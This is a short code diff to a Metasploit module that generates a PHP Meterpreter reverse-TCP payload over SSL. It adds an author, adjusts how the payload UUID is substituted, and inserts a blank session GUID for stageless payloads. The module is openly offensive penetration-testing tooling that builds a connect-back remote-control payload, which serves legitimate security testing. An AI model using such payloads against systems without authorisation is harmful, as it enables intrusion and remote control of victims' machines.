@@ -18,7 +18,7 @@ module MetasploitModule
     super(update_info(info,
       'Name'          => 'PHP Meterpreter, Reverse TCP Inline Using SSL',
       'Description'   => 'Connect back to attacker with SSL and spawn a Meterpreter server (PHP)',
-      'Author'        => ['RageLtMan <rageltman[at]sempervictus>'],
+      'Author'        => ['egypt', 'RageLtMan <rageltman[at]sempervictus>'],
       'Platform'      => 'php',
       'Arch'          => ARCH_PHP,
       'Handler'       => Msf::Handler::ReverseTcpSsl,
@@ -27,7 +27,6 @@ module MetasploitModule
   end
 
   def generate
-
     met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
     met.gsub!("ion connect($ipaddr, $port, $proto='tcp')","ion connect($ipaddr, $port, $proto='ssl')")
 
@@ -36,7 +35,11 @@ module MetasploitModule
 
     uuid = generate_payload_uuid
     bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
-    met = met.sub("\"PAYLOAD_UUID\", \"\"", "\"PAYLOAD_UUID\", \"#{bytes}\"")
+    met = met.sub(%q|"PAYLOAD_UUID", ""|, %Q|"PAYLOAD_UUID", "#{bytes}"|)
+
+    # Stageless payloads need to have a blank session GUID
+    session_guid = '\x00' * 16
+    met = met.sub(%q|"SESSION_GUID", ""|, %Q|"SESSION_GUID", "#{session_guid}"|)
 
     met.gsub!(/#.*$/, '') 
     met = Rex::Text.compress(met)
